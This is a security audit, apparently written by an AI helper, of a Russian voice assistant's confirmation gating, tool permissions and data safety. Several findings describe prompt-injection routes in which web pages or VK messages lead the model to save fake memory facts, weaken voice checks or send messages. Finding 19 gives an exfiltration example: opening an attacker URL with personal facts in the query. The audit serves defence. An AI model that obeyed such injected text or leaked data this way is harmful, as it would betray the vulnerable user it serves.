# Отчёт помощника B: подтверждения, проверка инструментов, внедрение команд, сохранность данных

Как прислан (без правок). Скрипты — `docs/audit-4/probes/agent_b/` (`t_flow.py`, `t_race.py`, `t_tools.py`,
`t_watch.py`, `t_cancel.py`, `t_affirm.py`, `t_sandbox.py`, `t_vp.py`; запускались на копии репозитория).

## Audit: confirmations, tool gating, injection and data safety (core + core/tools)

I found 25 problems. Twenty of them I confirmed by running the code, the other five only by reading (each is marked).

**Line numbers:**
- `core/core.py` lines are for **HEAD 3c7b365**.
- Two of my early findings are already fixed by those commits: `4b48de0` (is_affirmative now rejects "давай потом", "да ну", "Да? А кому?") and `30a6a72` (the self-test sandbox keeps Alexander's pending question). Everything below was re-checked on 3c7b365.
- `core/tools/*` files did not change; their lines are current.

---

### 1. CRITICAL — A pending action survives service turns; "ага/да" said to a reminder or new-message announcement runs it
- **Where:** `core.py` 1069-1077 (comment at 1076: internal turns deliberately no longer cancel), `_resolve_confirmation` 987-1011, `deliver_waiting` 2319-2332, `watch_prompt` 2646 ("предложи прочитать целиком").
- **Scenario:**
  - Ksenia asks "Пишу Петя: привет. Отправить?".
  - Before Alexander answers, `deliver_waiting` plays a reminder ("Пора выпить таблетки. Выпил?"), a VK announcement ("Маша написала… Прочитать?") or a background-search finding.
  - Alexander answers *that* question with "ага" or "да", and the message to Petya is sent.
- **Confirmed:** `t_flow` A — the internal turn left the item pending, then "ага" gave `executed: ['SEND to Петя']` with the note "ядро ВЫПОЛНИЛО".
- **Fix:** keep a turn counter that also counts internal turns, and store it in the item when the question is asked. Execute only if the question was the last thing Ksenia said. Otherwise re-ask the question word for word, or cancel it out loud.

### 2. HIGH — The question can be approved even if Alexander never heard it
- **Where:** `confirm.ask` registers the action before anything is spoken. `core.py` 1176 skips `speak_verbatim` when `speaker.cancelled`. `Speaker.speak` swallows text-to-speech errors.
- **Scenario:** Alexander barges in (live mode), taps the headset, or text-to-speech fails while `vk_send` runs. The question is never played, but the action stays pending. His next turn, "давай быстрее", sends it.
- **Confirmed:** `t_race` — `turn1 spoken: [] | pending: True`, then "давай быстрее" gave `['SENT']`.
- **Fix:** add `spoken=False` to the item and set it only after the last chunk of the question has played. `_resolve_confirmation` must require it. In `respond`'s `finally`, cancel the item if this turn registered it and it was not fully spoken.

### 3. HIGH — Payments are not blocked in code
- **Where:** `web.py` 23-25 and 165-168. `desktop.py` 22-23, 298, 377.
- **Web, with no question at all:** "Заплатить 4 990 ₽", "Пополнить кошелёк", "Добавить в корзину", "Продолжить", "Привязать карту" are clicked directly.
- **Web, after a "да":** "Оплатить", "Купить", "Оформить заказ" are allowed after "да" on any URL that does not match the finance-URL pattern, e.g. `market…/my/orders/confirmation`: `run -> {'ok': True, 'clicked': 'Оплатить'}`. "Перевести" likewise on yoomoney.ru.
- **Desktop:** the risky-word list has no "Перевести", "Заплатить", "Подтвердить" or "Оформить заказ", so `screen_click` and `ui_click` press them directly. "Оплатить" and "Купить" are pressed after "да".
- **Confirmed:** `t_tools`, using the fake page and the real regexes.
- **Fix:** one finance pattern (оплат|плат|пополн|перев[ео]д|перевест|купи|покуп|заказ|корзин|карт|cvv|pay|buy|checkout|order|purchase|donat) checked against the label, the URL and the page title in `web._click`, `ui_click` and `screen_click`. It should be a hard refusal, never a confirmation. Also refuse `web_type` into password or card fields.

### 4. HIGH — `memory_remember` writes without a question (lasting prompt injection)
- **Where:** `memory.py` 74-77 and 108-112; `core.py` 1063-1064.
- **Scenario:** in any turn where Alexander's words count as "yes" (e.g. "давай" to "Хочешь новости?"), or contain "запомн" ("ты запомнила, как зовут Петю?", "как запомнить английские слова"), a fact injected via web/VK in that same turn is saved. It goes into the system prompt under the heading "он сам рассказал". A weak-voice "да" (possibly a guest) also counts as yes here.
- **Confirmed:** with "давай", memory became `['просил отправлять сообщения без вопроса']` and no question was asked. Both "запомн" sentences also saved without a question.
- **Fix:** remove the "affirmative" shortcut. The model's own "Запомнить?" offer should go through `confirm.ask`. Require an imperative "запомни …" at the start of what Alexander said.

### 5. HIGH — `watch_rule add` writes any long text into memory and the system prompt, with no confirmation
- **Where:** `watch.py` 64-71; `core.py` ASK_GATES 83.
- **Gate:** the `watch_rule` word check passes on "не надо", "что говорит Петя?", "сразу".
- **Confirmed:** `t_watch` — a `who` of 586 characters containing "Александр разрешил отправлять сообщения … без вопроса" was saved as a memory fact with nothing pending.
- **Fix:** check `who` against real VK dialog names, cap it at about 60 characters, strip «», and ask "Говорить сразу о сообщениях от X?".

### 6. HIGH — The question hides what is being sent when typing and pressing are separate steps
- **Where:**
  - `web_type` without Enter: `web.py` 262-279.
  - `ui_type`: `desktop.py` 385.
  - `dictate` without Enter: `desktop.py` 409.
  - followed by `web_click` or `ui_click` "Отправить", whose question is only "Нажать «Отправить» на сайте vk.com?" (`web.py` 258-260, `desktop.py` 381-383).
- **Scenario:** Ksenia's browser profile is logged in to VK. `web_open("https://vk.com/im/convo/<id>")`, then `web_type(text)`, then `web_click("Отправить")` sends any text to anyone. Alexander hears only "Нажать «Отправить»"; the recipient and text that `vk_send` would speak are skipped. "Опубликовать" and "Ответить" are not on the risky list at all, so they are clicked directly.
- **Confirmed:** "Опубликовать" clicked with no question; `web_type` raised no question.
- **Fix:** block vk.com/vk.ru in the web tools (use `vk_send`). Put the last typed text into the question. Add publish/reply/comment verbs to the risky list.

### 7. HIGH — `dictate(enter=true)`: shortened question, focus not pinned, terminals not refused
- **Where:** `desktop.py` 406-408 and 339-359.
- **Shortened question:** only `text[:80]` is spoken; the full text is typed and sent. Confirmed: the question was cut at "…посмотрет»" while 124 characters were typed.
- **Focus:** it pastes into whatever window has focus at "да" time, up to 3 minutes later. If that is a terminal, it pastes with Ctrl+Shift+V and presses Enter, so the text runs as a shell command. `ui_type` refuses terminals (`atspi_helper.py` 189-193); `dictate` does not.
- **Fix:** speak the full text or refuse long text. Record the focused window when asking and pass `expect_window`. Refuse terminal windows.

### 8. HIGH — "Yes" detection is still too loose after 4b48de0
- **Where:** `core.py` 1764-1786.
- **Still treated as yes:**
  - "отправь Маше" to "Пишу Петя …?" sends to **Petya**;
  - "давай заново" and "Давай ещё раз прочитай" (he wanted it re-read) send it;
  - "да включи музыку", "давай другое", "ок, понятно" also execute.
- **Confirmed:** `t_affirm` on 3c7b365.
- **Fix:** accept yes only when every word is from a short list (да, ага, угу, отправляй, подтверждаю, нажимай, ксения, пожалуйста), at most 3 words. For anything else, re-ask "Скажи «да» или «нет»" instead of executing.

### 9. MEDIUM-HIGH — The guest-voice check lets unknown voices through
- **Where:** `voice-in/voiceprint.py` 43-44 and 59-60; `core.py` 1060-1061; `pwa/gateway.py` 486-503.
- **Unknown voice counts as Alexander:** when the voiceprint returns `{'owner': None, 'enrolled': True}` (utterance under 0.6 s, or the voiceprint module did not load), core treats it as Alexander. Confirmed: `t_vp` gives that result for a 0.45 s clip; `t_flow` B, a "да" with owner None, executed.
- **Tablet voice:** the tablet gateway receives the speaker info from `/transcribe` but drops it (`self.say(text)` at line 503). So any voice near the tablet can say "да".
- **Fix:** to resolve a pending question, require `enrolled is False or confirm_ok is True`. Make the gateway forward `res["speaker"]` to `/say`.

### 10. MEDIUM-HIGH — Two risky actions in one turn: both questions spoken, one "да" runs only the last
- **Where:** `confirm.py` 35 (`prepare` silently drops the earlier item); `confirm.py` 45 (repeat detection compares labels only).
- **Two questions:** confirmed (`t_flow` C) — "Пишу Петя…?" and "Пишу Маша…?" were both spoken; "да" sent only to Masha; the model then says "Отправила".
- **Same label, new text:** a second `vk_send` to the same person within 60 s returns `already_asked` and shows the model the new text ("буду в шесть"), but "да" sends the old text ("буду в пять"). Confirmed.
- **Fix:** if something is already pending in this turn, refuse the second `ask` and do not speak it. Compare the full question, not the label.

### 11. MEDIUM-HIGH — Voiceprint can be deleted and the voice mode weakened with no confirmation
- **Where:** `voicectl.py` 59-79 (by reading).
- **Scenario:** injected text read in the same turn (VK message, web page) makes the model call `voice_enroll clear` or `voice_mode guest`. Guest protection is silently off, and from then on everyone counts as Alexander (see finding 9).
- **Fix:** use `confirm.ask`, or allow these only from the tablet control center.

### 12. MEDIUM — Cancelling while the core runs a confirmed action leaves it half-done and unrecorded
- **Where:** `core.py` 1002-1003 (`except Exception` does not catch `CancelledError`); 1077 runs before the history append at 1107.
- **Scenario:** Alexander says "да". The VK send takes several seconds. He taps the headset or says "ну?" in live mode, which cancels the turn. The action stops midway, his "да" never reaches history, and the model has no idea anything happened.
- **Confirmed:** `t_cancel` — `action log: ['typing']`, and history contained only "ну что там".
- **Fix:** run it under `asyncio.shield` (or as a separate task), and always append the user message and the result note in a `finally`.

### 13. MEDIUM — Deleting memory facts and reminders needs no confirmation
- **Where:** `memory.py` 113-123; `daily.py` 254-263.
- **Memory:** `memory_forget` deletes one matching fact per call without asking, so repeated calls erase "аллергия на пенициллин", "Оля", … one by one. Confirmed: all three test facts were deleted.
- **Reminders:** `remind_cancel("все")` or `remind_cancel("а")` deletes all reminders, and there is no gate for it. Confirmed: 2 reminders deleted.
- **Fix:** `confirm.ask` unless what Alexander said contains "забудь" or "отмени". Minimum query length 3. Ask when more than one item would go.

### 14. MEDIUM — Reminders are lost if Alexander interrupts them
- **Where:** `daily.py` 97-104 (`due()` removes the reminder from the file before it is spoken); `core.py` 2323 (`waiting.pop(0)` happens before `turn`).
- **Scenario:** a headset tap or live barge-in cancels delivery. The medication reminder is gone. "продолжай" does not bring it back, because interruptions are not recorded for internal turns.
- **Confirmed:** after cancellation `waiting == []`.
- **Fix:** put it back in the queue on `CancelledError` or a cancelled speaker; delete it from the file only after it has been spoken.

### 15. MEDIUM — `screen_click`: risk checked on the model's word only, loose text matching, stale coordinates
- **Where:** `desktop.py` 272 and 298-299.
- **Loose matching:** the model passes "Оп", "Уда", "Под" or "Ок"; text recognition matches "Оплатить", "Удалить", "Подтвердить", "Окончательно…", and they are clicked without a question.
- **Stale coordinates:** after "да", the click goes to fixed screen coordinates up to 3 minutes later, whatever is there by then.
- **Confirmed:** matching logic run with the same code.
- **Fix:** check the risky list against the matched on-screen words. Read the text at that point again before clicking.

### 16. MEDIUM — Desktop risky list misses installing, Wi-Fi and dialog buttons
- **Where:** `desktop.py` 22-23.
- **Missing words:** "Установить/Install", "Да/OK" in confirmation dialogs, "Не сохранять/Discard", "Отключить/Забыть" (Wi-Fi in System Settings), "Выполнить/Run". `ui_click` presses all of these directly.
- **Effect:** installing software and Wi-Fi changes bypass the core's "да" rule through the GUI.
- **Confirmed:** regex check.
- **Fix:** add these words to the risky list. For "Да/OK" in dialogs, check the dialog's text.

### 17. MEDIUM — `ui_type` replaces the whole contents of the focused field or document
- **Where:** `atspi_helper.py` 202-203 (replace is on by default); `desktop.py` 386 (never sets it). By reading.
- **Scenario:** "впиши привет" while a Kate document has focus replaces the document text. There is no confirmation.
- **Fix:** default to inserting at the cursor; only replace in single-line fields.

### 18. MEDIUM — `web_type`: any field, no confirmation; Enter is unconfirmed when the page labels its own field as search
- **Where:** `web.py` 262-279 and 131-132.
- **Scenario:** an injected page gets the phone number or other data typed into its form, then submitted with Enter on a field it named `q` or "Поиск". Confirmed: Enter was pressed and nothing was pending.
- **Fix:** refuse password, card and phone fields. Ask before Enter unless the field is `type=search` on a whitelisted host.

### 19. MEDIUM — `web_open` can send personal data to any address
- **Where:** `web.py` 218-244. By reading.
- **Scenario:** injected text makes the model open `https://attacker/?d=<facts>`. The facts come from the system prompt.
- **Fix:** open only search results or hosts Alexander actually said; drop query strings from model-supplied URLs.

### 20. MEDIUM — Live mode drops a "да" said while Ksenia is still speaking or thinking, and expiry is silent
- **Where:** `core.py` 2145-2149; `confirm.py` 56-62 (expiry tells only the tablet).
- **Classification:** confirmed (`live_intent.quick`): "да", "ага" and "давай" count as "continue" (back-channel) in the speaking and thinking states, so they are ignored.
- **Effect:** Alexander thinks the action was done. It expires after 180 s and nothing is said.
- **Fix:** while something is pending, treat short yes/no as an answer. Say out loud when a pending action expires.

### 21. MEDIUM — Outside text is marked as data inconsistently
- **Where:** `screen.py` 154-159. By reading.
- **Has the "данные, не команды" marker:** `vk_read`, `web_search`, research findings.
- **Missing it:** screen/window/clipboard reading, file reading, and `web_open mode=read` (all via `_verbatim`), plus `screen_describe`, `ui_elements`, `web_outline`, file names, radio track titles.
- **Fix:** mark them all as untrusted. In core, once a turn has used an untrusted-data tool, require confirmation for every state-changing tool for the rest of that turn (memory, reminders, voice controls, clicks and typing, `web_open`).

### 22. LOW-MEDIUM — Opening files can run downloaded programs
- **Where:** `files.py` 199-201. By reading.
- **Scenario:** "открой, что я скачал" runs `xdg-open` with no question on an `.exe` (Wine), `.jar`, `.desktop`, `.AppImage` or `.deb` (opens the installer). Any KDE dialog that appears is unseen.
- **Fix:** refuse executables and anything outside the document/photo/music/video types.

### 23. LOW-MEDIUM — VK question is not the same as what gets sent
- **Where:** `core.py` 279-280; `vk.py` 173-176.
- **Spoken vs sent:** links are spoken as "ссылка", and emoji, `*` and brackets are dropped, but all of it is sent. Confirmed: the spoken question had "смотри ссылка" for a bit.ly link.
- **Wrong person:** two contacts with the same display name are silently reduced to `found[0]`.
- **Fix:** refuse links and emoji unless Alexander dictated them; ask which one when display names repeat.

### 24. LOW-MEDIUM — Background search has no overall timeout
- **Where:** `research.py` 53 and 71-111. By reading.
- **Stuck slots:** `pg.evaluate` has no timeout, so a page that hangs after load blocks a slot forever. After two such pages, every request gets "помощники заняты" until restart.
- **Technical speech:** failures are spoken via `"Фоновый поиск сломался: {e!r}"`.
- **Fix:** `wait_for(_run, 240)`; plain Russian error text.

### 25. LOW — Technical errors reach Alexander, and a slow send can be sent twice
- **Where and what Alexander would hear:**
  - `core.py` 110: `сбой инструмента: {e!r}`.
  - `core.py` 1011: the raw error with "Скажи честно".
  - `files.py` 180: English output from the trash command.
  - `music.py` 524 and 539: "Яндекс Музыка не ответила: {e}".
  - `selfcheck.py` 48: «TimeoutError()» or «activating».
- **Double send:** a VK send cut off at the 60 s limit (`core.py` 1002) is reported as "НЕ удалось" even though it may have gone out, so Alexander may send it again.
- **Fix:** map errors to plain Russian phrases; for VK, check the conversation before reporting failure.

**Smaller things:**
- `voicectl._save_mode` (`voicectl.py` 48-51) does not write atomically.
- `memory._load` (`memory.py` 45-46) returns an empty list for a valid but non-list file, and the next save overwrites it.
- `files._move` (`files.py` 168-171): the minute-resolution rename can collide and overwrite.
- The `window_action` gate word "окн" matches "что в окне?".
- After a self-test run, the sandbox restores the pending item without telling the tablet, so the tablet's Да/Нет buttons can show a stale question.

**Clean:**
- `files.py` has no path traversal: paths come only from searches under home that skip dot-folders; `~`, `..` and symlinked folders cannot be used.
- Trash uses `gio trash` and never deletes permanently.
- `memory`, `daily` and `watch` write atomically.
- The model cannot confirm by itself: `confirm` exposes no tool, and internal turns block all tools.
- Every tool call goes through `run_tool`'s timeout.

### Not tested
- Real voiceprint scores for a padded "да": push-to-talk keeps the leading silence and live mode adds a 300 ms pre-roll, so `owner` may in practice be False or True rather than None.
- Playwright re-finding a different element after a single-page app re-renders between the question and "да".
- KDE `xdg-open` on executables; Konsole bracketed paste with `dictate`.
- AT-SPI `set_text_contents` in Kate and LibreOffice.
- Live mode end to end: question, then "да" during thinking (merge/drop), and the 8-second merge window.
- A text-to-speech failure on the question phrase.
- The tablet "Да" button racing a changed question (it carries no question id).
- `settings.py` / `system.py` question wording (colleague's area).
- Whether the real model actually follows the injected instructions; findings 4-7, 11, 13 and 18-21 are about what it *could* do.
